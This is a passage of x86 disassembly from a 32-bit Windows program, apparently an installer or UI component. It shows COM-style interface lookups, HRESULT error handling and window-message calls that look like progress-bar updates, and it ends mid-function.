  4042f6:	mov    DWORD PTR [ebp-0xa50],0x401340
  404300:	push   esi
  404301:	mov    esi,DWORD PTR [ebp+0xc]
  404304:	mov    ebx,ecx
  404306:	mov    DWORD PTR [ebp-0xa4c],eax
  40430c:	mov    DWORD PTR [ebp-0xa48],eax
  404312:	mov    DWORD PTR [ebp-0xa44],eax
  404318:	push   edi
  404319:	mov    edi,edx
  40431b:	test   esi,esi
  40431d:	je     0x40433a
  40431f:	jmp    0x404334
  404321:	push   DWORD PTR [esi+0x4]
  404324:	push   eax
  404325:	lea    eax,[ebp-0xa50]
  40432b:	push   eax
  40432c:	call   0x402d30
  404331:	lea    esi,[esi+0x8]
  404334:	mov    eax,DWORD PTR [esi]
  404336:	test   eax,eax
  404338:	jne    0x404321
  40433a:	lea    eax,[ebp-0xa50]
  404340:	mov    ecx,ebx
  404342:	push   eax
  404343:	call   0x402740
  404348:	mov    esi,eax
  40434a:	test   esi,esi
  40434c:	js     0x40447a
  404352:	mov    esi,DWORD PTR ds:0x408460
  404358:	lea    eax,[ebp-0x20c]
  40435e:	push   0x104
  404363:	push   eax
  404364:	xor    ebx,ebx
  404366:	push   esi
  404367:	mov    DWORD PTR [ebp-0xa38],ebx
  40436d:	call   DWORD PTR ds:0x409060
  404373:	test   eax,eax
  404375:	jne    0x404383
  404377:	call   0x402dbf
  40437c:	mov    esi,eax
  40437e:	jmp    0x40446f
  404383:	cmp    eax,0x104
  404388:	jne    0x40439f
  40438a:	lea    ecx,[ebp-0xa38]
  404390:	call   0x4031d8
  404395:	mov    esi,0x8007007a
  40439a:	jmp    0x40447a
  40439f:	lea    eax,[ebp-0x20c]
  4043a5:	mov    edx,0x208
  4043aa:	push   eax
  4043ab:	lea    ecx,[ebp-0xa34]
  4043b1:	call   0x402b00
  4043b6:	test   esi,esi
  4043b8:	je     0x4043cd
  4043ba:	push   ebx
  4043bb:	call   DWORD PTR ds:0x409048
  4043c1:	cmp    esi,eax
  4043c3:	je     0x4043cd
  4043c5:	lea    eax,[ebp-0xa34]
  4043cb:	jmp    0x404439
  4043cd:	push   0x22
  4043cf:	pop    esi
  4043d0:	lea    eax,[ebp-0xa34]
  4043d6:	mov    WORD PTR [ebp-0x624],si
  4043dd:	push   eax
  4043de:	mov    edx,0x20a
  4043e3:	lea    ecx,[ebp-0x622]
  4043e9:	call   0x402b53
  4043ee:	test   al,al
  4043f0:	jne    0x404404
  4043f2:	lea    ecx,[ebp-0xa38]
  4043f8:	call   0x4031d8
  4043fd:	mov    esi,0x80004005
  404402:	jmp    0x40447a
  404404:	lea    ecx,[ebp-0x624]
  40440a:	call   0x402b8f
  40440f:	mov    WORD PTR [ebp+eax*2-0x624],si
  404417:	lea    eax,[eax*2+0x2]
  40441e:	cmp    eax,0x418
  404423:	jae    0x4044eb
  404429:	xor    ecx,ecx
  40442b:	mov    WORD PTR [ebp+eax*1-0x624],cx
  404433:	lea    eax,[ebp-0x624]
  404439:	push   eax
  40443a:	push   0x401498
  40443f:	lea    eax,[ebp-0xa50]
  404445:	push   eax
  404446:	call   0x402d30
  40444b:	mov    esi,eax
  40444d:	test   esi,esi
  40444f:	js     0x40446f
  404451:	lea    eax,[ebp-0xa34]
  404457:	push   eax
  404458:	push   0x4014a8
  40445d:	lea    eax,[ebp-0xa50]
  404463:	push   eax
  404464:	call   0x402d30
  404469:	mov    esi,eax
  40446b:	test   esi,esi
  40446d:	jns    0x40449a
  40446f:	lea    ecx,[ebp-0xa38]
  404475:	call   0x4031d8
  40447a:	lea    ecx,[ebp-0xa50]
  404480:	call   0x402ad9
  404485:	mov    ecx,DWORD PTR [ebp-0x4]
  404488:	mov    eax,esi
  40448a:	pop    edi
  40448b:	pop    esi
  40448c:	xor    ecx,ebp
  40448e:	pop    ebx
  40448f:	call   0x4071f0
  404494:	mov    esp,ebp
  404496:	pop    ebp
  404497:	ret    0x8
  40449a:	mov    DWORD PTR [ebp-0xa3c],ebx
  4044a0:	cmp    DWORD PTR [ebp+0x8],ebx
  4044a3:	je     0x4044ad
  4044a5:	test   edi,edi
  4044a7:	je     0x4044d9
  4044a9:	push   0x1
  4044ab:	jmp    0x4044b2
  4044ad:	test   edi,edi
  4044af:	je     0x4044d9
  4044b1:	push   ebx
  4044b2:	push   0x4014c0
  4044b7:	push   edi
  4044b8:	lea    eax,[ebp-0x20c]
  4044be:	push   eax
  4044bf:	lea    ecx,[ebp-0xa50]
  4044c5:	call   0x40416f
  4044ca:	lea    ecx,[ebp-0xa3c]
  4044d0:	mov    esi,eax
  4044d2:	call   0x4031d8
  4044d7:	jmp    0x40446f
  4044d9:	lea    ecx,[ebp-0xa3c]
  4044df:	call   0x4031d8
  4044e4:	mov    esi,0x80070057
  4044e9:	jmp    0x40446f
  4044eb:	call   0x407470
  4044f0:	int3   
  4044f1:	int3   
  4044f2:	int3   
  4044f3:	int3   
  4044f4:	int3   
  4044f5:	int3   
  4044f6:	int3   
  4044f7:	int3   
  4044f8:	int3   
  4044f9:	int3   
  4044fa:	int3   
  4044fb:	int3   
  4044fc:	int3   
  4044fd:	int3   
  4044fe:	int3   
  4044ff:	int3   
  404500:	mov    edi,edi
  404502:	push   ebp
  404503:	mov    ebp,esp
  404505:	push   DWORD PTR [ebp+0x14]
  404508:	mov    edx,DWORD PTR [ebp+0xc]
  40450b:	push   DWORD PTR [ebp+0x10]
  40450e:	mov    ecx,DWORD PTR [ebp+0x8]
  404511:	call   0x4042de
  404516:	pop    ebp
  404517:	ret    0x10
  40451a:	int3   
  40451b:	int3   
  40451c:	int3   
  40451d:	int3   
  40451e:	int3   
  40451f:	mov    edi,edi
  404521:	push   ebp
  404522:	mov    ebp,esp
  404524:	sub    esp,0xc
  404527:	mov    eax,ds:0x408008
  40452c:	xor    eax,ebp
  40452e:	mov    DWORD PTR [ebp-0x4],eax
  404531:	mov    DWORD PTR [ebp-0x8],ecx
  404534:	push   ebx
  404535:	push   esi
  404536:	push   edi
  404537:	mov    edi,edx
  404539:	test   ecx,ecx
  40453b:	je     0x40461b
  404541:	test   edi,edi
  404543:	je     0x40461b
  404549:	mov    eax,DWORD PTR [ebp+0xc]
  40454c:	test   eax,eax
  40454e:	jne    0x40455a
  404550:	mov    eax,0x80004003
  404555:	jmp    0x404620
  40455a:	mov    esi,DWORD PTR [ebp+0x8]
  40455d:	xor    edx,edx
  40455f:	mov    DWORD PTR [eax],edx
  404561:	cmp    DWORD PTR [esi],edx
  404563:	jne    0x404602
  404569:	cmp    DWORD PTR [esi+0x4],edx
  40456c:	jne    0x404602
  404572:	cmp    DWORD PTR [esi+0x8],0xc0
  404579:	jne    0x404602
  40457f:	cmp    DWORD PTR [esi+0xc],0x46000000
  404586:	jne    0x404602
  404588:	mov    edi,DWORD PTR [edi+0x4]
  40458b:	add    edi,ecx
  40458d:	mov    eax,DWORD PTR [edi]
  40458f:	push   edi
  404590:	mov    esi,DWORD PTR [eax+0x4]
  404593:	mov    ecx,esi
  404595:	call   DWORD PTR ds:0x409254
  40459b:	call   esi
  40459d:	mov    eax,DWORD PTR [ebp+0xc]
  4045a0:	mov    DWORD PTR [eax],edi
  4045a2:	xor    eax,eax
  4045a4:	jmp    0x404620
  4045a6:	mov    ecx,DWORD PTR [edi]
  4045a8:	xor    edx,edx
  4045aa:	test   ecx,ecx
  4045ac:	sete   dl
  4045af:	mov    DWORD PTR [ebp-0xc],edx
  4045b2:	test   edx,edx
  4045b4:	jne    0x4045d7
  4045b6:	mov    eax,DWORD PTR [ecx]
  4045b8:	cmp    eax,DWORD PTR [esi]
  4045ba:	jne    0x4045fc
  4045bc:	mov    eax,DWORD PTR [ecx+0x4]
  4045bf:	cmp    eax,DWORD PTR [esi+0x4]
  4045c2:	jne    0x4045fc
  4045c4:	mov    eax,DWORD PTR [ecx+0x8]
  4045c7:	cmp    eax,DWORD PTR [esi+0x8]
  4045ca:	jne    0x4045fc
  4045cc:	mov    eax,DWORD PTR [ecx+0xc]
  4045cf:	cmp    eax,DWORD PTR [esi+0xc]
  4045d2:	jne    0x4045fc
  4045d4:	mov    eax,DWORD PTR [ebp+0xc]
  4045d7:	cmp    ebx,0x1
  4045da:	je     0x404610
  4045dc:	push   DWORD PTR [edi+0x4]
  4045df:	mov    ecx,ebx
  4045e1:	push   eax
  4045e2:	push   esi
  4045e3:	push   DWORD PTR [ebp-0x8]
  4045e6:	call   DWORD PTR ds:0x409254
  4045ec:	call   ebx
  4045ee:	test   eax,eax
  4045f0:	je     0x404620
  4045f2:	cmp    DWORD PTR [ebp-0xc],0x0
  4045f6:	jne    0x4045fc
  4045f8:	test   eax,eax
  4045fa:	js     0x404620
  4045fc:	mov    eax,DWORD PTR [ebp+0xc]
  4045ff:	add    edi,0xc
  404602:	mov    ebx,DWORD PTR [edi+0x8]
  404605:	test   ebx,ebx
  404607:	jne    0x4045a6
  404609:	mov    eax,0x80004002
  40460e:	jmp    0x404620
  404610:	mov    edi,DWORD PTR [edi+0x4]
  404613:	add    edi,DWORD PTR [ebp-0x8]
  404616:	jmp    0x40458d
  40461b:	mov    eax,0x80070057
  404620:	mov    ecx,DWORD PTR [ebp-0x4]
  404623:	pop    edi
  404624:	pop    esi
  404625:	xor    ecx,ebp
  404627:	pop    ebx
  404628:	call   0x4071f0
  40462d:	mov    esp,ebp
  40462f:	pop    ebp
  404630:	ret    0x8
  404633:	int3   
  404634:	int3   
  404635:	int3   
  404636:	int3   
  404637:	int3   
  404638:	mov    edi,edi
  40463a:	push   ebp
  40463b:	mov    ebp,esp
  40463d:	push   esi
  40463e:	push   edi
  40463f:	mov    edi,ecx
  404641:	xor    esi,esi
  404643:	cmp    DWORD PTR [edi+0xc],esi
  404646:	jne    0x404654
  404648:	call   0x405b76
  40464d:	mov    DWORD PTR [edi+0xc],eax
  404650:	test   eax,eax
  404652:	je     0x40466f
  404654:	cmp    DWORD PTR [ebp+0x8],esi
  404657:	jne    0x40465e
  404659:	cmp    DWORD PTR [ebp+0xc],esi
  40465c:	je     0x40466c
  40465e:	push   DWORD PTR [ebp+0xc]
  404661:	push   DWORD PTR [ebp+0x8]
  404664:	push   DWORD PTR [edi+0xc]
  404667:	call   0x405bf7
  40466c:	xor    esi,esi
  40466e:	inc    esi
  40466f:	pop    edi
  404670:	mov    eax,esi
  404672:	pop    esi
  404673:	pop    ebp
  404674:	ret    0x8
  404677:	int3   
  404678:	int3   
  404679:	int3   
  40467a:	int3   
  40467b:	int3   
  40467c:	test   ecx,ecx
  40467e:	je     0x4046ac
  404680:	cmp    ecx,0xc
  404683:	je     0x4046a5
  404685:	cmp    ecx,0x16
  404688:	je     0x40469e
  40468a:	cmp    ecx,0x22
  40468d:	je     0x40469e
  40468f:	cmp    ecx,0x50
  404692:	je     0x4046ac
  404694:	mov    ecx,0x80004005
  404699:	jmp    0x4046c7
  40469e:	mov    ecx,0x80070057
  4046a3:	jmp    0x404699
  4046a5:	mov    ecx,0x8007000e
  4046aa:	jmp    0x404699
  4046ac:	mov    eax,ecx
  4046ae:	ret    
  4046af:	int3   
  4046b0:	int3   
  4046b1:	int3   
  4046b2:	int3   
  4046b3:	int3   
  4046b4:	push   0x0
  4046b6:	push   0x0
  4046b8:	push   0x1
  4046ba:	push   ecx
  4046bb:	call   DWORD PTR ds:0x409044
  4046c1:	ret    
  4046c2:	int3   
  4046c3:	int3   
  4046c4:	int3   
  4046c5:	int3   
  4046c6:	int3   
  4046c7:	xor    eax,eax
  4046c9:	cmp    ecx,0x8007000e
  4046cf:	sete   al
  4046d2:	lea    ecx,[eax-0x1]
  4046d5:	and    ecx,0x6
  4046d8:	add    ecx,0xc0000017
  4046de:	jmp    0x4046b4
  4046e3:	int3   
  4046e4:	int3   
  4046e5:	int3   
  4046e6:	int3   
  4046e7:	int3   
  4046e8:	int3   
  4046e9:	int3   
  4046ea:	int3   
  4046eb:	int3   
  4046ec:	int3   
  4046ed:	int3   
  4046ee:	int3   
  4046ef:	int3   
  4046f0:	mov    edi,edi
  4046f2:	push   ebp
  4046f3:	mov    ebp,esp
  4046f5:	push   esi
  4046f6:	mov    esi,ecx
  4046f8:	cmp    DWORD PTR [esi+0x14],0x0
  4046fc:	je     0x404706
  4046fe:	push   DWORD PTR [esi+0x14]
  404701:	call   0x405c7e
  404706:	test   BYTE PTR [ebp+0x8],0x1
  40470a:	je     0x404713
  40470c:	push   esi
  40470d:	call   0x406e3c
  404712:	pop    ecx
  404713:	mov    eax,esi
  404715:	pop    esi
  404716:	pop    ebp
  404717:	ret    0x4
  40471a:	int3   
  40471b:	int3   
  40471c:	int3   
  40471d:	int3   
  40471e:	int3   
  40471f:	mov    edi,edi
  404721:	push   ebp
  404722:	mov    ebp,esp
  404724:	sub    esp,0xc
  404727:	mov    eax,ds:0x408008
  40472c:	xor    eax,ebp
  40472e:	mov    DWORD PTR [ebp-0x4],eax
  404731:	mov    eax,ds:0x40803c
  404736:	push   ebx
  404737:	push   esi
  404738:	mov    ebx,ecx
  40473a:	mov    esi,DWORD PTR [eax+0xc]
  40473d:	mov    ecx,esi
  40473f:	push   edi
  404740:	call   DWORD PTR ds:0x409254
  404746:	mov    ecx,0x40803c
  40474b:	call   esi
  40474d:	mov    edx,DWORD PTR [ebp+0x8]
  404750:	lea    esi,[eax+0x10]
  404753:	mov    DWORD PTR [ebp-0x8],esi
  404756:	test   edx,edx
  404758:	jns    0x4047be
  40475a:	push   ecx
  40475b:	lea    ecx,[ebp-0xc]
  40475e:	call   0x4050e1
  404763:	lea    edi,[esi-0x10]
  404766:	mov    edx,DWORD PTR [eax]
  404768:	lea    ecx,[edx-0x10]
  40476b:	cmp    ecx,edi
  40476d:	je     0x40479d
  40476f:	cmp    DWORD PTR [edi+0xc],0x0
  404773:	jl     0x40478e
  404775:	mov    eax,DWORD PTR [ecx]
  404777:	cmp    eax,DWORD PTR [edi]
  404779:	jne    0x40478e
  40477b:	call   0x40549d
  404780:	mov    ecx,edi
  404782:	mov    esi,eax
  404784:	call   0x405536
  404789:	add    esi,0x10
  40478c:	jmp    0x40479d
  40478e:	push   DWORD PTR [edx-0xc]
  404791:	lea    ecx,[ebp-0x8]
  404794:	push   edx
  404795:	call   0x405406
  40479a:	mov    esi,DWORD PTR [ebp-0x8]
  40479d:	mov    ecx,DWORD PTR [ebp-0xc]
  4047a0:	add    ecx,0xfffffff0
  4047a3:	call   0x405536
  4047a8:	push   ecx
  4047a9:	mov    eax,esp
  4047ab:	push   ecx
  4047ac:	mov    DWORD PTR [eax],0x6e
  4047b2:	mov    eax,esp
  4047b4:	mov    DWORD PTR [eax],esi
  4047b6:	mov    ecx,DWORD PTR [ebx+0x4]
  4047b9:	call   0x402442
  4047be:	lea    ecx,[esi-0x10]
  4047c1:	call   0x405536
  4047c6:	mov    ecx,DWORD PTR [ebp-0x4]
  4047c9:	pop    edi
  4047ca:	pop    esi
  4047cb:	xor    ecx,ebp
  4047cd:	pop    ebx
  4047ce:	call   0x4071f0
  4047d3:	mov    esp,ebp
  4047d5:	pop    ebp
  4047d6:	ret    0x4
  4047d9:	int3   
  4047da:	int3   
  4047db:	int3   
  4047dc:	int3   
  4047dd:	int3   
  4047de:	mov    edi,edi
  4047e0:	push   ebx
  4047e1:	push   esi
  4047e2:	push   edi
  4047e3:	mov    ebx,ecx
  4047e5:	lock inc DWORD PTR ds:0x408418
  4047ec:	lea    edi,[ebx+0x4]
  4047ef:	push   ecx
  4047f0:	mov    ecx,edi
  4047f2:	call   0x404edb
  4047f7:	push   0x70
  4047f9:	push   DWORD PTR [edi]
  4047fb:	call   DWORD PTR ds:0x4090ac
  404801:	push   0x640000
  404806:	push   0x0
  404808:	mov    esi,eax
  40480a:	push   0x401
  40480f:	push   esi
  404810:	call   DWORD PTR ds:0x4090bc
  404816:	push   0x0
  404818:	push   0x1
  40481a:	push   0x404
  40481f:	push   esi
  404820:	call   DWORD PTR ds:0x4090bc
  404826:	push   0x0
  404828:	push   0x3e8
  40482d:	push   0x64
  40482f:	push   DWORD PTR [edi]
  404831:	call   DWORD PTR ds:0x4090b0
  404837:	mov    DWORD PTR [ebx+0x3c],eax
  40483a:	pop    edi
  40483b:	pop    esi
  40483c:	pop    ebx
  40483d:	test   eax,eax
  40483f:	jne    0x404850
  404841:	call   DWORD PTR ds:0x409040
  404847:	mov    ecx,eax
  404849:	call   0x4038d0
  40484e:	jmp    0x404852
  404850:	xor    eax,eax
  404852:	ret    0x10
  404855:	int3   
  404856:	int3   
  404857:	int3   
  404858:	int3   
  404859:	int3   
  40485a:	mov    edi,edi
  40485c:	push   ebp
  40485d:	mov    ebp,esp
  40485f:	sub    esp,0x10
  404862:	mov    eax,ds:0x408008
  404867:	xor    eax,ebp
  404869:	mov    DWORD PTR [ebp-0x4],eax
  40486c:	mov    eax,ds:0x40803c
  404871:	and    DWORD PTR [ebp-0x8],0x0
  404875:	push   ebx
  404876:	push   esi
  404877:	mov    esi,DWORD PTR [eax+0xc]
  40487a:	mov    ebx,ecx
  40487c:	push   edi
  40487d:	mov    ecx,esi
  40487f:	xor    edi,edi
  404881:	call   DWORD PTR ds:0x409254
  404887:	mov    ecx,0x40803c
  40488c:	call   esi
  40488e:	lea    esi,[eax+0x10]
  404891:	mov    DWORD PTR [ebp-0xc],esi
  404894:	cmp    DWORD PTR ds:0x4083dc,edi
  40489a:	jne    0x4048a8
  40489c:	mov    DWORD PTR [ebp-0x10],0x80070057
  4048a3:	jmp    0x40492b
  4048a8:	push   DWORD PTR [ebx+0x3c]
  4048ab:	push   DWORD PTR [ebx+0x4]
  4048ae:	call   DWORD PTR ds:0x4090b4
  4048b4:	lea    eax,[ebp-0x8]
  4048b7:	push   eax
  4048b8:	lea    eax,[ebx+0x2c]
  4048bb:	push   eax
  4048bc:	call   DWORD PTR ds:0x409118
  4048c2:	mov    DWORD PTR [ebp-0x10],eax
  4048c5:	test   eax,eax
  4048c7:	js     0x40492b
  4048c9:	push   DWORD PTR [ebp-0x8]
  4048cc:	lea    ecx,[ebp-0xc]
  4048cf:	call   0x40509f
  4048d4:	push   ecx
  4048d5:	push   0x40174c
  4048da:	lea    ecx,[ebp-0xc]
  4048dd:	call   0x404b37
  4048e2:	push   ecx
  4048e3:	push   0x401750
  4048e8:	lea    ecx,[ebp-0xc]
  4048eb:	call   0x404b37
  4048f0:	mov    esi,DWORD PTR [ebp-0xc]
  4048f3:	push   DWORD PTR [esi-0xc]
  4048f6:	push   esi
  4048f7:	call   DWORD PTR ds:0x40908c
  4048fd:	mov    edi,eax
  4048ff:	test   edi,edi
  404901:	je     0x404990
  404907:	push   0x0
  404909:	call   DWORD PTR ds:0x409088
  40490f:	mov    eax,ds:0x4083dc
  404914:	test   eax,eax
  404916:	je     0x40491d
  404918:	add    eax,0x20
  40491b:	jmp    0x40491f
  40491d:	xor    eax,eax
  40491f:	push   eax
  404920:	push   edi
  404921:	mov    ecx,ebx
  404923:	call   0x40499b
  404928:	mov    DWORD PTR [ebp-0x10],eax
  40492b:	push   DWORD PTR [ebp-0x8]
  40492e:	call   DWORD PTR ds:0x40910c
  404934:	and    DWORD PTR [ebp-0x8],0x0
  404938:	mov    eax,DWORD PTR [ebp-0x10]
  40493b:	test   eax,eax
  40493d:	jns    0x40496b
  40493f:	push   eax
  404940:	mov    ecx,ebx
  404942:	call   0x40471f
  404947:	mov    eax,DWORD PTR [ebx+0x28]
  40494a:	test   eax,eax
  40494c:	je     0x404956
  40494e:	lock dec DWORD PTR [eax+0x2c]
  404952:	and    DWORD PTR [ebx+0x28],0x0
  404956:	push   0x0
  404958:	push   DWORD PTR [ebx+0x4]
  40495b:	call   DWORD PTR ds:0x4090cc
  404961:	mov    ecx,0x408410
  404966:	call   0x402290
  40496b:	lea    ecx,[esi-0x10]
  40496e:	call   0x405536
  404973:	push   edi
  404974:	call   DWORD PTR ds:0x409088
  40497a:	mov    ecx,DWORD PTR [ebp-0x4]
  40497d:	mov    eax,DWORD PTR [ebp-0x10]
  404980:	xor    ecx,ebp
  404982:	pop    edi
  404983:	pop    esi
  404984:	pop    ebx
  404985:	call   0x4071f0
  40498a:	mov    esp,ebp
  40498c:	pop    ebp
  40498d:	ret    0x10
  404990:	call   0x40548e
  404995:	int3   
  404996:	int3   
  404997:	int3   
  404998:	int3   
  404999:	int3   
  40499a:	int3   
  40499b:	mov    edi,edi
  40499d:	push   ebp
  40499e:	mov    ebp,esp
  4049a0:	push   ecx
  4049a1:	push   ecx
  4049a2:	mov    eax,ds:0x408008
  4049a7:	xor    eax,ebp
  4049a9:	mov    DWORD PTR [ebp-0x4],eax
  4049ac:	mov    eax,ds:0x40803c
  4049b1:	push   ebx
  4049b2:	push   esi
  4049b3:	mov    ebx,ecx
  4049b5:	mov    esi,DWORD PTR [eax+0xc]
  4049b8:	mov    ecx,esi
  4049ba:	push   edi
  4049bb:	call   DWORD PTR ds:0x409254
  4049c1:	mov    ecx,0x40803c
  4049c6:	call   esi
  4049c8:	lea    esi,[eax+0x10]
  4049cb:	mov    eax,DWORD PTR [ebx+0x28]
  4049ce:	mov    DWORD PTR [ebp-0x8],esi
  4049d1:	test   eax,eax
  4049d3:	je     0x4049dd
  4049d5:	lock dec DWORD PTR [eax+0x2c]
  4049d9:	and    DWORD PTR [ebx+0x28],0x0
  4049dd:	push   0x54
  4049df:	call   0x406e60
  4049e4:	mov    edi,eax
  4049e6:	pop    ecx
  4049e7:	test   edi,edi
  4049e9:	je     0x404a3a
  4049eb:	xor    eax,eax
  4049ed:	mov    DWORD PTR [edi],0x4013fc
  4049f3:	mov    DWORD PTR [edi+0x4],0x4013ec
  4049fa:	mov    DWORD PTR [edi+0x8],0x4013dc
  404a01:	mov    DWORD PTR [edi+0xc],0x4013cc
  404a08:	mov    DWORD PTR [edi+0x10],eax
  404a0b:	mov    DWORD PTR [edi+0x14],eax
  404a0e:	mov    DWORD PTR [edi+0x18],eax
  404a11:	mov    DWORD PTR [edi+0x1c],eax
  404a14:	mov    DWORD PTR [edi+0x20],eax
  404a17:	mov    DWORD PTR [edi+0x24],eax
  404a1a:	mov    DWORD PTR [edi+0x28],eax
  404a1d:	mov    DWORD PTR [edi+0x2c],eax
  404a20:	lea    eax,[edi+0x30]
  404a23:	push   eax
  404a24:	call   DWORD PTR ds:0x409038
  404a2a:	and    DWORD PTR [edi+0x4c],0x0
  404a2e:	xor    eax,eax
  404a30:	mov    BYTE PTR [edi+0x48],0x1
  404a34:	mov    WORD PTR [edi+0x50],ax
  404a38:	jmp    0x404a3c
  404a3a:	xor    edi,edi
  404a3c:	mov    DWORD PTR [ebx+0x28],edi
  404a3f:	test   edi,edi
  404a41:	jne    0x404a4a
  404a43:	mov    edi,0x80000002
  404a48:	jmp    0x404a7a
  404a4a:	lock inc DWORD PTR [edi+0x2c]
  404a4e:	push   ecx
  404a4f:	lea    ecx,[ebp-0x8]
  404a52:	call   0x404e80
  404a57:	mov    esi,DWORD PTR [ebp-0x8]
  404a5a:	test   eax,eax
  404a5c:	mov    eax,esi
  404a5e:	jne    0x404a65
  404a60:	mov    eax,0x401758
  404a65:	push   eax
  404a66:	push   0x1
  404a68:	push   0x1
  404a6a:	push   DWORD PTR [ebp+0xc]
  404a6d:	push   DWORD PTR [ebp+0x8]
  404a70:	push   DWORD PTR [ebx+0x28]
  404a73:	call   0x4060e0
  404a78:	mov    edi,eax
  404a7a:	lea    ecx,[esi-0x10]
  404a7d:	call   0x405536
  404a82:	mov    ecx,DWORD PTR [ebp-0x4]
  404a85:	mov    eax,edi
  404a87:	pop    edi
  404a88:	pop    esi
  404a89:	xor    ecx,ebp
  404a8b:	pop    ebx
  404a8c:	call   0x4071f0
  404a91:	mov    esp,ebp
  404a93:	pop    ebp
  404a94:	ret    0x8
  404a97:	int3   
  404a98:	int3   
  404a99:	int3   
  404a9a:	int3   
  404a9b:	int3   
  404a9c:	int3   
  404a9d:	int3   
  404a9e:	int3   
  404a9f:	int3   
  404aa0:	mov    edi,edi
  404aa2:	push   ebp
  404aa3:	mov    ebp,esp
  404aa5:	mov    eax,DWORD PTR [ebp+0x8]
  404aa8:	push   esi
  404aa9:	push   edi
  404aaa:	push   0x70
  404aac:	push   DWORD PTR [eax-0x1c]
  404aaf:	xor    edi,edi
  404ab1:	call   DWORD PTR ds:0x4090ac
  404ab7:	mov    esi,eax
  404ab9:	test   esi,esi
  404abb:	jne    0x404ac4
  404abd:	mov    edi,0x80070057
  404ac2:	jmp    0x404ae0
  404ac4:	push   ebx
  404ac5:	mov    ebx,DWORD PTR [ebp+0xc]
  404ac8:	test   ebx,ebx
  404aca:	je     0x404adf
  404acc:	push   edi
  404acd:	push   edi
  404ace:	push   0x405
  404ad3:	push   esi
  404ad4:	call   DWORD PTR ds:0x4090bc
  404ada:	sub    ebx,0x1
  404add:	jne    0x404acc
  404adf:	pop    ebx
  404ae0:	mov    eax,edi
  404ae2:	pop    edi
  404ae3:	pop    esi
  404ae4:	pop    ebp
  404ae5:	ret    0x8
  404ae8:	int3   
  404ae9:	int3   
  404aea:	int3   
  404aeb:	int3   
  404aec:	int3   
  404aed:	int3   
  404aee:	int3   
  404aef:	int3   
  404af0:	mov    edi,edi
  404af2:	push   ebp
  404af3:	mov    ebp,esp
  404af5:	push   esi
  404af6:	push   edi
  404af7:	mov    edi,DWORD PTR [ebp+0x8]
  404afa:	xor    esi,esi
  404afc:	cmp    DWORD PTR [edi+0x8],esi
  404aff:	jne    0x404b08
  404b01:	mov    esi,0x80070057
  404b06:	jmp    0x404b2a
  404b08:	push   esi
  404b09:	push   DWORD PTR [edi-0x1c]
  404b0c:	call   DWORD PTR ds:0x4090cc
  404b12:	mov    eax,DWORD PTR [edi+0x8]
  404b15:	test   eax,eax
  404b17:	je     0x404b20
  404b19:	lock dec DWORD PTR [eax+0x2c]
  404b1d:	mov    DWORD PTR [edi+0x8],esi
  404b20:	mov    ecx,0x408410
  404b25:	call   0x402290
  404b2a:	pop    edi
  404b2b:	mov    eax,esi
  404b2d:	pop    esi
  404b2e:	pop    ebp
  404b2f:	ret    0x8
  404b32:	int3   
  404b33:	int3   
  404b34:	int3   
  404b35:	int3   
  404b36:	int3   
  404b37:	mov    edi,edi
  404b39:	push   ebp
  404b3a:	mov    ebp,esp
  404b3c:	sub    esp,0x24
  404b3f:	push   edi
  404b40:	mov    edi,ecx
  404b42:	mov    ecx,DWORD PTR [ebp+0x8]
  404b45:	mov    DWORD PTR [ebp-0x10],edi
  404b48:	call   0x404d5f
  404b4d:	mov    DWORD PTR [ebp-0x4],eax
  404b50:	test   eax,eax
  404b52:	je     0x404cc1
  404b58:	push   ebx
  404b59:	push   esi
  404b5a:	mov    ecx,0x401748
  404b5f:	call   0x404d5f
  404b64:	mov    esi,DWORD PTR [edi]
  404b66:	xor    ebx,ebx
  404b68:	mov    DWORD PTR [ebp-0x8],eax
  404b6b:	mov    DWORD PTR [ebp-0x18],ebx
  404b6e:	mov    ecx,DWORD PTR [esi-0xc]
  404b71:	lea    eax,[esi+ecx*2]
  404b74:	mov    DWORD PTR [ebp-0x14],eax
  404b77:	cmp    esi,eax
  404b79:	jae    0x404cbd
  404b7f:	mov    edi,DWORD PTR [ebp-0x4]
  404b82:	push   DWORD PTR [ebp+0x8]
  404b85:	push   esi
  404b86:	call   DWORD PTR ds:0x409220
  404b8c:	pop    ecx
  404b8d:	pop    ecx
  404b8e:	test   eax,eax
  404b90:	je     0x404ba9
  404b92:	push   DWORD PTR [ebp+0x8]
  404b95:	lea    esi,[eax+edi*2]
  404b98:	inc    ebx
  404b99:	push   esi
  404b9a:	call   DWORD PTR ds:0x409220
  404ba0:	pop    ecx
  404ba1:	pop    ecx
  404ba2:	test   eax,eax
  404ba4:	jne    0x404b92
  404ba6:	mov    DWORD PTR [ebp-0x18],ebx
  404ba9:	mov    ecx,esi
  404bab:	call   0x404d5f
  404bb0:	lea    esi,[esi+eax*2]
  404bb3:	add    esi,0x2
  404bb6:	cmp    esi,DWORD PTR [ebp-0x14]
  404bb9:	jb     0x404b82
  404bbb:	mov    edi,DWORD PTR [ebp-0x10]
  404bbe:	test   ebx,ebx
  404bc0:	jle    0x404cbd
  404bc6:	mov    eax,DWORD PTR [edi]
  404bc8:	mov    edi,DWORD PTR [ebp-0x8]
  404bcb:	sub    edi,DWORD PTR [ebp-0x4]
  404bce:	imul   edi,ebx
  404bd1:	mov    esi,DWORD PTR [eax-0xc]
  404bd4:	add    edi,esi
  404bd6:	mov    DWORD PTR [ebp-0x24],edi
  404bd9:	mov    eax,edi
  404bdb:	cmp    edi,esi
  404bdd:	jg     0x404be1
  404bdf:	mov    eax,esi
  404be1:	mov    ecx,DWORD PTR [ebp-0x10]
  404be4:	push   eax
  404be5:	call   0x4053a6
  404bea:	mov    DWORD PTR [ebp-0x1c],eax
  404bed:	mov    ebx,eax
  404bef:	lea    ecx,[eax+esi*2]
  404bf2:	mov    DWORD PTR [ebp-0x20],ecx
  404bf5:	cmp    eax,ecx
  404bf7:	jae    0x404cb1
  404bfd:	mov    edi,esi
  404bff:	push   DWORD PTR [ebp+0x8]
  404c02:	push   ebx
  404c03:	call   DWORD PTR ds:0x409220
  404c09:	mov    edx,eax
  404c0b:	mov    DWORD PTR [ebp-0xc],edx
  404c0e:	pop    ecx
  404c0f:	pop    ecx
  404c10:	test   edx,edx
  404c12:	je     0x404c98
  404c18:	mov    eax,DWORD PTR [ebp-0x8]
  404c1b:	lea    ebx,[eax+eax*1]
  404c1e:	mov    DWORD PTR [ebp-0x14],ebx
  404c21:	jmp    0x404c26
  404c23:	mov    ebx,DWORD PTR [ebp-0x14]
  404c26:	mov    eax,edx
  404c28:	mov    esi,edi
  404c2a:	sub    eax,DWORD PTR [ebp-0x1c]
  404c2d:	add    ebx,edx
  404c2f:	sar    eax,1
  404c31:	sub    esi,eax
